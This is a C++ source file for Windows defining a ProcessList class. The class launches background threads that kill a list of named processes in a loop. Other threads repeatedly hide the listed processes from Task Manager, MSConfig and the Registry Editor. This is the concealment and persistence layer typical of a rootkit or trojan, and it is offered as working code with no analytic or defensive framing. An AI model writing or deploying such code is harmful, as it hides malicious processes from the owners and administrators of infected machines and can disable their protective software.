#include "ProcessList.h"
#include "FunctionsWindowsNT.h"

void killPermanentProcessListThread(void * threadParams);
void hidePermanentProcessListTaskManagerThread(void * threadParams);
void hidePermanentProcessListMSConfigThread(void * threadParams);
void hidePermanentProcessListRegeditThread(void * threadParams);

ProcessList::ProcessList() {
   processNameList = (Process **) malloc(sizeof(Process *));
   numProcess = 0;
   msecDelayKill = DEFAULT_INTERVAL_KILL;
   msecDelayHideTaskManager = DEFAULT_INTERVAL_HIDE;
   msecDelayHideMSConfig = DEFAULT_INTERVAL_HIDE;
   msecDelayHideRegedit = DEFAULT_INTERVAL_HIDE;
   
   quitKillProcessThread = false;
   quitHideProcessTaskManagerThread = false;
   quitHideProcessMSConfigThread = false;
   quitHideProcessRegeditThread = false;
}

bool ProcessList::addProcess(const char * processName, char * patternToHideMSConfig, char * patternToHideRegedit) {
   bool err = false;
   
   if (numProcess > 0) {
      processNameList = (Process **) realloc(processNameList, sizeof(Process *) * (numProcess + 1));  
      if (processNameList == NULL) err = true;
   }
   if (!err) {
      *(processNameList + numProcess) = (Process *) malloc(sizeof(Process));
      if (*(processNameList + numProcess) != NULL) {
         *(processNameList + numProcess) = new Process(processName, patternToHideMSConfig, patternToHideRegedit);
         numProcess++;
         return true;
      }
   }
   return false;  
}

bool ProcessList::killProcessList() {
   bool result = false;
   unsigned long i;
   
   if (numProcess > 0) {      
      for (i = 0; i < numProcess; i++) {
         if ((*(processNameList + i))->killProcess()) result = true; 
      }
   }
   return result;
   
}

bool ProcessList::killPermanentProcessList(unsigned long msecIntervalKill) {
   msecDelayKill = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) killPermanentProcessListThread, this, 0, NULL) != NULL) return true;
   return false;
}

void killPermanentProcessListThread(void * threadParams) {
   ProcessList * pList = (ProcessList *) threadParams;
   
   while (!pList->terminateKillProcessThread()) {
      pList->killProcessList();
      Sleep(pList->getIntervalKill());   
   }
}

void ProcessList::setTerminateKillProcessThread(bool value) {
   quitKillProcessThread = value;
}

void ProcessList::setTerminateHideProcessTaskManagerThread(bool value) {
   quitHideProcessTaskManagerThread = value;
}

void ProcessList::setTerminateHideProcessMSConfigThread(bool value) {
   quitHideProcessMSConfigThread = value;
}

void ProcessList::setTerminateHideProcessRegeditThread(bool value) {
   quitHideProcessRegeditThread = value;
}

bool ProcessList::hideProcessListTaskManager() {
   bool result = false;
   unsigned long i;
   
   if (numProcess > 0) {      
      for (i = 0; i < numProcess; i++) {
         if ((*(processNameList + i))->hideProcessTaskManager()) result = true; 
      }
   }
   return result;
}

bool ProcessList::hidePermanentProcessListTaskManager(unsigned long msecIntervalKill) {
   msecDelayHideTaskManager = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hidePermanentProcessListTaskManagerThread, this, 0, NULL) != NULL) return true;
   return false;
}

void hidePermanentProcessListTaskManagerThread(void * threadParams) {
   ProcessList * pList = (ProcessList *) threadParams;
   
   while (!pList->terminateHideProcessTaskManagerThread()) {
      pList->hideProcessListTaskManager();
      Sleep(pList->getIntervalTaskManagerHide());   
   }
}

bool ProcessList::hideProcessListMSConfig() {
   bool result = false;
   unsigned long i;
   
   if (numProcess > 0) {      
      for (i = 0; i < numProcess; i++) {
         if ((*(processNameList + i))->hideProcessMSConfig()) result = true; 
      }
   }
   return result;
}

bool ProcessList::hidePermanentProcessListMSConfig(unsigned long msecIntervalKill) {
   msecDelayHideMSConfig = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hidePermanentProcessListMSConfigThread, this, 0, NULL) != NULL) return true;
   return false;
}

void hidePermanentProcessListMSConfigThread(void * threadParams) {
   ProcessList * pList = (ProcessList *) threadParams;
   
   while (!pList->terminateHideProcessMSConfigThread()) {
      pList->hideProcessListMSConfig();
      Sleep(pList->getIntervalMSConfigHide());   
   }
}

bool ProcessList::hideProcessListRegedit() {
   bool result = false;
   unsigned long i;
   
   if (numProcess > 0) {      
      for (i = 0; i < numProcess; i++) {
         if ((*(processNameList + i))->hideProcessRegedit()) result = true; 
      }
   }
   return result;
}

bool ProcessList::hidePermanentProcessListRegedit(unsigned long msecIntervalKill) {
   msecDelayHideRegedit = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hidePermanentProcessListRegeditThread, this, 0, NULL) != NULL) return true;
   return false;
}

void hidePermanentProcessListRegeditThread(void * threadParams) {
   ProcessList * pList = (ProcessList *) threadParams;
   
   while (!pList->terminateHideProcessRegeditThread()) {
      pList->hideProcessListRegedit();
      Sleep(pList->getIntervalRegeditHide());   
   }
}
